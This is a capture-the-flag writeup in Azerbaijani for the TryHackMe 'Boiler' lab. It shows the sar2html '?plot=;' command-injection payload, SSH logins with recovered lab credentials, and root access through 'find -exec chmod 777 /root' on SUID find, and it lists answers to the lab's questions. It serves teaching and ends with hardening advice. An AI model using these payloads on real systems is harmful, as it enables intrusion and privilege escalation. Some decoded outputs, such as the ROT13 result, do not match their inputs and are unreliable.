# 🫧 TryHackMe — Boiler CTF Writeup (Azərbaycanca)

> **Çətinlik:** Orta (Intermediate)  
> **Xəbərdarlıq:** Bu CTF çox **rabbit hole** (yanlış iz) ehtiva edir — çaşdırmaq üçün!  
> **Hədəf:** user.txt (.secret) və root qovluğuna giriş  
> **Texnologiya:** FTP, ROT13, ASCII→Base64→MD5, Joomla, sar2html RCE, find SUID

---

## 📋 Suallar və Cavablar

| Sual | Cavab |
|------|-------|
| Anonymous FTP-dəki faylın uzantısı? | `.txt` |
| Ən yüksək portda nə var? | `ssh` |
| Port 10000-də nə işləyir? | `Webmin` |
| Port 10000-i exploit etmək olur? | `No` |
| Hansı CMS-ə giriş var? | `joomla` |
| Digər istifadəçinin şifrəsi harada saxlanılıb? | `/home/basterd/backup.sh` |
| user.txt | `.secret` faylında |
| Root üçün nə exploit edildi? | `find` (SUID) |

---

## 🗺️ Hücum Axışı

```
Nmap → 4 açıq port (21, 80, 10000, 55007)
    ↓
FTP anonymous → .info.txt → ROT13 → "Enumeration is the key!" (troll)
    ↓
robots.txt → ASCII→Base64→MD5 → "kidding" (yenə troll!)
    ↓
Gobuster /joomla/ → /_test → sar2html RCE
    ↓
log.txt → basterd:superduperp@$$ → SSH port 55007
    ↓
backup.sh → stoner:superduperp@$$no1knows
    ↓
su stoner → .secret → user flag
    ↓
find SUID → find . -exec chmod 777 /root \; → root qovluğu açılır → root flag
```

---

## Addım 1 — Port Skanlaması (Nmap)

```bash
nmap -Pn -A -v <TARGET_IP>
```

**İlk skan nəticəsi (əsas portlar):**

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3 (Anonymous FTP login allowed)
80/tcp    open  http    Apache httpd 2.4.18
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
```

**Tam port skanı (bütün portlar üçün):**

```bash
nmap -Pn -p- <TARGET_IP>
```

```
55007/tcp open  ssh     OpenSSH 7.2p2
```

**Əsas məlumatlar:**

| Port | Servis | Qeyd |
|------|--------|------|
| 21 | FTP | Anonymous giriş var |
| 80 | HTTP | Apache web server |
| 10000 | Webmin | MiniServ 1.930 — exploit yoxdur |
| 55007 | SSH | Standart 22 deyil! |

> **Sual 2 cavabı:** Ən yüksək portda `ssh` işləyir (55007)  
> **Sual 3 cavabı:** Port 10000-də `Webmin` işləyir  
> **Sual 4 cavabı:** Port 10000-i exploit etmək olmur — versiya güncəldir

---

## Addım 2 — FTP Anonymous Giriş

```bash
ftp <TARGET_IP>
```

```
Name: anonymous
Password: (boş, Enter)
```

Daxil oluruq. `ls` əmri heç nə göstərmir. **Gizli faylları** axtarırıq:

```bash
ls -la
```

```
-rw-r--r-- 1 ftp ftp 74 Aug 21 2019 .info.txt
```

Gizli `.info.txt` faylı var! Yükləyirik:

```bash
get .info.txt
exit
cat .info.txt
```

**Nəticə — şifrəli mətn:**

```
Sffecret Aqefvtgr: Raho pvchqba vf gur xrl!
```

Bu **ROT13** şifrəsidir!

### ROT13 nədir?

ROT13 hər hərfi əlifbada 13 mövqe irəli sürüşdürür. Məsələn: A→N, B→O, C→P.

**Decode etmək üçün:**

```bash
echo "Sffecret Aqefvtgr: Raho pvchqba vf gur xrl!" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Nəticə:**
```
Frreecret Enumerate: Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

> **Troll №1:** Bu sadəcə "davam et, enumerate et" mesajıdır. Faydalı məlumat yoxdur!

> **Sual 1 cavabı:** FTP-dəki faylın uzantısı `.txt`-dir

---

## Addım 3 — Web Saytı və robots.txt

`http://<TARGET_IP>/robots.txt` açırıq:

```
User-agent: *
Disallow: /tmp
Disallow: /.ssh
Disallow: /yellow
Disallow: /not
Disallow: /a+rabbit
Disallow: /hole
Disallow: /or
Disallow: /is
Disallow: /it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

Rəqəm sətirini çeviririk:

**Addım 1 — ASCII-dən Mətnə:**

```
079 084 108 105 ... → OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQk
```

**Addım 2 — Base64 Decode:**

```bash
echo "OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQk" | base64 -d
```

```
99b0660cd95adea327c54182baa51584$
```

**Addım 3 — MD5 Decrypt (md5online.org):**

```
99b0660cd95adea327c54182baa51584 → kidding
```

> **Troll №2:** Nəticə "kidding" — yəni yenə zarafat! robots.txt tamamilə rabbit hole-dur.

---

## Addım 4 — Gobuster ilə Joomla Tapmaq

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

**Tapılan:**

```
/joomla
/robots.txt
/manual
```

> **Sual 5 cavabı:** CMS — `joomla`

### Joomla daxilini enumerate etmək:

```bash
gobuster dir -u http://<TARGET_IP>/joomla/ -w /usr/share/wordlists/dirb/common.txt
```

**Tapılan maraqlı qovluq:**

```
/joomla/_test
```

---

## Addım 5 — sar2html RCE (Remote Code Execution)

`http://<TARGET_IP>/joomla/_test/` açırıq. **sar2html** tətbiqi işləyir.

### sar2html nədir?

SAR (System Activity Report) məlumatlarını HTML formatına çevirən vebə əsaslı alətdir. Lakin köhnə versiyalarında **Remote Code Execution** açığı var!

**Exploit-DB:** [47204](https://www.exploit-db.com/exploits/47204)

### RCE-ni Test Etmək:

URL-in sonuna `?plot=;KOMANDA` əlavə edirik:

```
http://<TARGET_IP>/joomla/_test/index.php?plot=;ls
```

**Nəticə (səhifənin "Select Host" dropdown-unda görünür):**

```
log.txt
index.php
sarpage.php
```

`log.txt` faylı var! Oxuyuruq:

```
http://<TARGET_IP>/joomla/_test/index.php?plot=;cat log.txt
```

**Nəticə:**

```
Aug 20 11:16:02 parrot sshd[2443]: Failed password for invalid user XXXXXXXXXXXXXXX from 192.168.X.X
Aug 20 11:16:02 parrot sshd[2443]: Failed password for basterd from 192.168.X.X
...
basterd:superduperp@$$
```

✅ **SSH credentials tapıldı:**
- **İstifadəçi:** `basterd`
- **Şifrə:** `superduperp@$$`

---

## Addım 6 — SSH ilə Giriş

Diqqət: SSH port **55007**-dədir!

```bash
ssh basterd@<TARGET_IP> -p 55007
```

```
Password: superduperp@$$
```

✅ **Sistemə daxil olduq — `basterd` kimi!**

---

## Addım 7 — backup.sh-da Gizli Şifrə

```bash
ls -la
```

```
-rwxr-xr-x 1 basterd basterd 791 Aug 22 2019 backup.sh
```

`backup.sh` faylını oxuyuruq:

```bash
cat backup.sh
```

**Faylın məzmunu:**

```bash
#!/bin/bash
REMOTE_USER=stoner
REMOTE_PASS=superduperp@$$no1knows
REMOTE_HOST=remotebackupserver.example.com
...
```

✅ **Yeni credentials tapıldı:**
- **İstifadəçi:** `stoner`
- **Şifrə:** `superduperp@$$no1knows`

> **Sual 6 cavabı:** Digər istifadəçinin şifrəsi `/home/basterd/backup.sh`-da saxlanılıb

---

## Addım 8 — stoner İstifadəçisinə Keçid və User Flag

```bash
su stoner
Password: superduperp@$$no1knows
```

```bash
ls -la
```

```
-rw-r--r-- 1 stoner stoner 34 Aug 21 2019 .secret
```

Gizli `.secret` faylı var:

```bash
cat .secret
```

```
You did it! You really did it!
```

🏁 **User flag tapıldı!**

> **Sual 7 cavabı:** user.txt `.secret` faylındadır

---

## Addım 9 — Privilege Escalation: find SUID

### 9.1 — sudo -l yoxlayaq

```bash
sudo -l
```

```
User stoner may run the following commands:
    (root) NOPASSWD: /NotReallyHere
```

> **Troll №3:** `/NotReallyHere` mövcud deyil — yenə zarafat!

### 9.2 — SUID Binaryləri Tapmaq

```bash
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```

**Nəticədə `find` özü SUID-dir:**

```
-rwsr-xr-x 1 root root 221768 Feb  8  2019 /usr/bin/find
```

`find` komandası **root kimi** işləyir — GTFOBins-ə görə bunu exploit edə bilərik!

### 9.3 — find SUID ilə Root Qovluğunu Aç

```bash
find . -exec chmod 777 /root \; 2>/dev/null
```

**Bu komanda nə edir?**

| Hissə | Mənası |
|-------|--------|
| `find .` | Cari qovluqda bir fayl tap |
| `-exec` | Tapılan hər fayl üçün komanda icra et |
| `chmod 777 /root` | Root qovluğuna hər kəsin oxuma/yazma icazəsi ver |
| `2>/dev/null` | Xətaları gizlət |

`find` SUID olduğundan bu komanda **root icazəsilə** işləyir!

```bash
ls /root/
cat /root/root.txt
```

🏆 **Root flag tapıldı! CTF tamamlandı!**

> **Sual 8 cavabı:** `find` SUID ilə root-a çatdıq

---

## 🐇 Rabbit Hole-lar (Yanlış İzlər)

Bu CTF-in xüsusiyyəti çoxlu **troll** məzmun ehtiva etməsidir:

| Rabbit Hole | Nə idi? |
|-------------|---------|
| FTP `.info.txt` | ROT13 → "Just wanted to see if you find it" — dəyərsiz |
| `robots.txt` rəqəmləri | ASCII→Base64→MD5 → "kidding" — dəyərsiz |
| Port 10000 (Webmin) | Exploit yoxdur — versiya güncəldir |
| `sudo -l` nəticəsi | `/NotReallyHere` — mövcud deyil |

> **Dərs:** CTF-lərdə hər ipucu faydalı olmaya bilər. Bütün yolları sınayın, tıxananda növbəti vektora keçin.

---

## 🔍 İstifadə Olunan Zəifliklər

| Zəiflik | Mərhələ | Şiddət |
|---------|---------|--------|
| FTP Anonymous Login | İlk məlumat toplama | 🟡 Orta |
| sar2html RCE | Shell almaq | 🔴 Kritik |
| Şifrənin bash skriptdə açıq saxlanması | İstifadəçi keçidi | 🔴 Kritik |
| find SUID misconfiguration | Root-a qalxmaq | 🔴 Kritik |

---

## 🛡️ Tövsiyələr

1. **FTP Anonymous girişini bağlayın** — İstehsal serverlərində anonim FTP olmamalıdır.
2. **Şifrələri skript fayllarında saxlamayın** — `.env` faylı, şifrə meneceri və ya vault istifadə edin.
3. **SSH-ı standart olmayan portda saxlamaq** — Tam qorunma vermir, amma brute-force cəhdlərini azaldır.
4. **SUID bitini lazımsız binarylərdən silin** — `find`, `vim`, `nmap` kimi alətlərə SUID VERMƏYİN:
   ```bash
   chmod u-s /usr/bin/find
   ```
5. **sar2html kimi köhnə veb alətlərini istifadə etməyin** — RCE açığı var.

---

## 🧰 İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port skanlaması |
| `ftp` | Anonymous FTP girişi |
| `tr` / dcode.fr | ROT13 decode |
| CyberChef / base64 | ASCII→Base64 çevirmə |
| md5online.org | MD5 decrypt |
| `gobuster` | Web qovluq taraması |
| sar2html RCE (exploit-db 47204) | Uzaqdan kod icra |
| `ssh` | Sisteme giriş |
| `find` (SUID) | Privilege Escalation |

---

## 📖 Bu CTF-dən Öyrənilənlər

- Tam port skanlamasının əhəmiyyəti (`-p-` flag)
- ROT13, Base64, ASCII şifrə növlərini tanımaq
- Rabbit hole-ları müəyyən etmək və vaxta qənaət etmək
- sar2html RCE açığı və URL-dən komanda icra etmək
- Bash skriptlərində gizli şifrə axtarışı
- `find` komandası ilə SUID privilege escalation
- `chmod` vasitəsilə root qovluğuna giriş

---

*Bu writeup yalnız təhsil məqsədilə hazırlanmışdır. Hər zaman icazəli sistemlərə qarşı test edin.*
